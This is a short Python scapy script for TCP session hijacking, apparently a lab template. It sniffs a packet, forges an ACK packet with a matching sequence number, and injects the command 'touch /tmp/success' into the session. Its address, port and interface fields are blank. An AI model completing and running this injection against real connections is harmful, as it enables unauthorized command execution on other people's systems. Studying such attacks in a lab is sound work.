#!/usr/bin/env python3
from scapy.all import *
def spoof_pkt(pkt):
	pkt.show()
	ip = IP()
	# To get info for each layer from the sniffed packet you can use pkt[layer_name], e.g. pkt[IP] give you access to the IP layer 
	ip.src = '' 
	ip.dst = ''
	# create a new TCP object
	tcp = TCP()
	tcp.sport = ''
	tcp.dport = ''
	tcp.flags='A'
	tcp.seq = pkt[TCP].seq + 1
	tcp.ack = pkt[TCP].ack 
	data = "\n touch /tmp/success \n"
	newpkt = ip/tcp/data
	send(newpkt)
	ls(newpkt)
	quit()
pkt = sniff(iface='', filter='', prn=spoof_pkt)
